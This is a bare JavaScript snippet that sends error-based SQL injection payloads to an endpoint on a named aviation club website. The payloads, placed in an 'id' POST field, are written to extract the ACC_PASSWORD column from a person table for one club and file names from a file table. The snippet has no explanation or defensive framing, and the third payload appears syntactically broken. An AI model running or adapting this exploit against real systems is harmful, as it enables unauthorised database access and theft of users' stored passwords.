var url = 'https://www.aircraftclubs.com/functions/aircraft/getAircraft.php',
    id = " ExtractValue(null,substr(concat(0x3a,(SELECT CONCAT(`ACC_PASSWORD`) FROM person WHERE ClubId = 29 limit 0,1)),1)) = 1 ",
    id2 = " CONVERT_TZ(1,(SELECT CONCAT(`FileName`) FROM file limit 0,1),1) = 1 ",
    id3 = " ExtractValue(null,(SELECT SHOW WARNINGS FROM file limit 0,1),1) = 1 ";
    

$.ajax({
    url:url,
    method:'POST',
    data:{
        id:id,
        a:'v'
    },
    success:function( data, textStatus, jqXHR ){
       console.log(data);
    },
    error:function( jqXHR, textStatus, errorThrown ){
        debugger;
    }
});
